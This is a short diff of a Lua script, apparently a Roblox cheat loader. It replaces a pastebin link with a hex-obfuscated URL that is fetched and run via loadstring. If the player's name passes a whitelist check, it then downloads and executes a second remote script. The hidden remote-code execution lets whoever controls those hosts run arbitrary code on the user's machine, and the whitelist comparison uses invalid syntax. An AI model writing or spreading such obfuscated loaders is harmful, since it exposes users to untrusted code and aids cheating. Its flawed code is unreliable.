@@ -1,6 +1,6 @@
 local Player = game.Players.LocalPlayer
 
-local Whitelisted = loadstring(game:HttpGet("https://pastebin.com/raw/JBhW0UXf"))()
+local Whitelisted = loadstring(game:HttpGet("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x2E\x63\x6F\x6D\x2F\x71\x61\x7A\x70\x69\x6E\x36\x36\x2F\x2D\x2F\x72\x65\x66\x73\x2F\x68\x65\x61\x64\x73\x2F\x6D\x61\x69\x6E\x2F\x32\x2E\x6C\x75\x61"))()
 
 if Player.Name = Whitelisted then
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Merdooon/skibidi-sigma-spec-ter/refs/heads/main/specter')))()
